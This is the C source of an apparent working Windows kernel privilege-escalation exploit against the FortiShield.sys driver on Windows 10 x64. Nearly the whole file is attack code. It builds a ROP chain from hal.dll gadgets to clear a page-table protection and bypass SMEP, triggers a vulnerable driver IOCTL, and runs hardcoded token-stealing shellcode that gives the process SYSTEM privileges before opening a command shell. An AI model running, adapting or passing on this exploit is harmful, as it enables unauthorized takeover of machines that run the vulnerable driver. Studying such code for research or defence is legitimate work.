/*
Check this out: 
- https://www.coresecurity.com/system/files/publications/2016/05/Windows%20SMEP%20bypass%20U%3DS.pdf
Tested on: 
- Windows 10 Pro x64 (Pre-Anniversary)
- hal.dll: 10.0.10240.16384
- FortiShield.sys: 5.2.3.633
Thanks to master @ryujin and @ronin for helping out.
*/

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>

#pragma comment (lib,"psapi")

ULONGLONG get_pxe_address_64(ULONGLONG address) {

	ULONGLONG result = address >> 9;
	result = result | 0xFFFFF68000000000;
	result = result & 0xFFFFF6FFFFFFFFF8;
	return result;

}

LPVOID GetBaseAddr(char *drvname) {

	LPVOID drivers[1024];
	DWORD cbNeeded;
	int nDrivers, i = 0;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {

		char szDrivers[1024];
		nDrivers = cbNeeded / sizeof(drivers[0]);
		for (i = 0; i < nDrivers; i++) {
			if (GetDeviceDriverBaseName(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
				//printf("%s (%p)\n", szDrivers, drivers[i]);
				if (strcmp(szDrivers, drvname) == 0) {
					//printf("%s (%p)\n", szDrivers, drivers[i]);
					return drivers[i];
				}
			}
		}
	}
	return 0;
}

DWORD trigger_callback() {

	printf("[+] Creating dummy file\n");
	system("echo test > test.txt");

	printf("[+] Calling MoveFileEx()\n");
	BOOL MFEresult;
	MFEresult = MoveFileEx((LPCSTR)"test.txt", (LPCSTR)"test2.txt", MOVEFILE_REPLACE_EXISTING);
	if (MFEresult == 0)
	{
		printf("[!] Error while calling MoveFileEx(): %d\n", GetLastError());
		return 1;
	}
	return 0;
}

int main() {

	HANDLE forti;
	forti = CreateFile((LPCSTR)"\\\\.\\FortiShield", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (forti == INVALID_HANDLE_VALUE) {
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		return 1;
	}

	LPVOID hal_base = GetBaseAddr("hal.dll");
	LPVOID fortishield_base = GetBaseAddr("FortiShield.sys");

	ULONGLONG va_pte = get_pxe_address_64(0x0000000048000000);
	ULONGLONG hal_pivot = (ULONGLONG)hal_base + 0x6bf0;
	ULONGLONG fortishield_callback = (ULONGLONG)fortishield_base + 0xd150;
	ULONGLONG fortishield_restore = (ULONGLONG)fortishield_base + 0x2f73;

	printf("[+] HAL.dll found at: %llx\n", (ULONGLONG)hal_base);
	printf("[+] FortiShield.sys found at: %llx\n", (ULONGLONG)fortishield_base);
	printf("[+] PTE virtual address at: %llx\n", va_pte);

	DWORD IoControlCode = 0x220028;
	ULONGLONG InputBuffer = hal_pivot;
	DWORD InputBufferLength = 0x8;
	ULONGLONG OutputBuffer = 0x0;
	DWORD OutputBufferLength = 0x0;
	DWORD lpBytesReturned;

	HANDLE pid;
	pid = GetCurrentProcess();
	ULONGLONG allocate_address = 0x0000000047FF016F;
	LPVOID allocate_shellcode;
	allocate_shellcode = VirtualAlloc((LPVOID*)allocate_address, 0x12000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (allocate_shellcode == NULL) {
		printf("[!] Error while allocating shellcode: %d\n", GetLastError());
		return 1;
	}

	char *shellcode;
	DWORD shellcode_size = 0x12000;
	ULONGLONG rop_01 = (ULONGLONG)hal_base + 0x668e;		// pop rdx; ret
	ULONGLONG rop_02 = 0x0000000000000063;					// DIRTY + ACCESSED + R/W + PRESENT
	ULONGLONG rop_03 = (ULONGLONG)hal_base + 0x987e;		// pop rax; ret
	ULONGLONG rop_04 = va_pte;
	ULONGLONG rop_05 = (ULONGLONG)hal_base + 0xe2cc;		// mov byte ptr [rax], dl; ret
	ULONGLONG rop_06 = (ULONGLONG)hal_base + 0x15a50;		// wbinvd; ret
	ULONGLONG rop_07 = allocate_address + 0x10040;
	ULONGLONG rop_08 = fortishield_callback;
	ULONGLONG rop_09 = fortishield_restore;

	//;kd> dt -r1 nt!_TEB
	//;   +0x110 SystemReserved1  : [54] Ptr64 Void
	//;??????+0x078 KTHREAD (not documented, can't get it from WinDBG directly)
	//kd> u nt!PsGetCurrentProcess
	//nt!PsGetCurrentProcess:
	//mov rax,qword ptr gs:[188h]
	//mov rax,qword ptr [rax+0B8h]

	// TOKEN STEALING & RESTORE
        // start:
        //     mov rdx, [gs:0x188]
        //     mov r8, [rdx+0x0b8]
        //     mov r9, [r8+0x2f0]
        //     mov rcx, [r9]
        // find_system_proc:
        //     mov rdx, [rcx-0x8]
        //     cmp rdx, 4
        //     jz found_it
        //     mov rcx, [rcx]
        //     cmp rcx, r9
        //     jnz find_system_proc
        // found_it:
        //     mov rax, [rcx+0x68]
        //     and al, 0x0f0
        //     mov [r8+0x358], rax
        // restore:
        // 	mov rbp, qword ptr [rsp+0x80]
        // 	xor rbx, rbx
        // 	mov [rbp], rbx
        // 	mov rbp, qword ptr [rsp+0x88]
        // 	mov rax, rsi
        // 	mov rsp, rax
        // 	sub rsp, 0x20
        // 	jmp rbp

	char token_steal[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4C\x8B\x82\xB8"
                                          "\x00\x00\x00\x4D\x8B\x88\xF0\x02\x00\x00\x49\x8B\x09"
                                          "\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x08\x48\x8B\x09"
                                          "\x4C\x39\xC9\x75\xEE\x48\x8B\x41\x68\x24\xF0\x49\x89"
                                          "\x80\x58\x03\x00\x00\x48\x8B\xAC\x24\x80\x00\x00\x00"
                                          "\x48\x31\xDB\x48\x89\x5D\x00\x48\x8B\xAC\x24\x88\x00"
                                          "\x00\x00\x48\x89\xF0\x48\x89\xC4\x48\x83\xEC\x20\xFF\xE5";

	shellcode = (char *)malloc(shellcode_size);
	memset(shellcode, 0x41, shellcode_size);
	memcpy(shellcode + 0x10008, &rop_01, 0x08);
	memcpy(shellcode + 0x10010, &rop_02, 0x08);
	memcpy(shellcode + 0x10018, &rop_03, 0x08);
	memcpy(shellcode + 0x10020, &rop_04, 0x08);
	memcpy(shellcode + 0x10028, &rop_05, 0x08);
	memcpy(shellcode + 0x10030, &rop_06, 0x08);
	memcpy(shellcode + 0x10038, &rop_07, 0x08);
	memcpy(shellcode + 0x10040, token_steal, sizeof(token_steal));
	memcpy(shellcode + 0x100C0, &rop_08, 0x08);
	memcpy(shellcode + 0x100C8, &rop_09, 0x08);

	BOOL WPMresult;
	SIZE_T written;
	WPMresult = WriteProcessMemory(pid, (LPVOID)allocate_address, shellcode, shellcode_size, &written);
	if (WPMresult == 0)
	{
		printf("[!] Error while calling WriteProcessMemory: %d\n", GetLastError());
		return 1;
	}

	HANDLE hThread;
	LPDWORD hThread_id = 0;
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&trigger_callback, NULL, 0, hThread_id);
	if (hThread == NULL)
	{
		printf("[!] Error while calling CreateThread: %d\n", GetLastError());
		return 1;
	}

	BOOL hThread_priority;
	hThread_priority = SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);
	if (hThread_priority == 0)
	{
		printf("[!] Error while calling SetThreadPriority: %d\n", GetLastError());
		return 1;
	}

	BOOL triggerIOCTL;
	triggerIOCTL = DeviceIoControl(forti, IoControlCode, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
	WaitForSingleObject(hThread, INFINITE);

	system("start cmd.exe");
	return 0;
}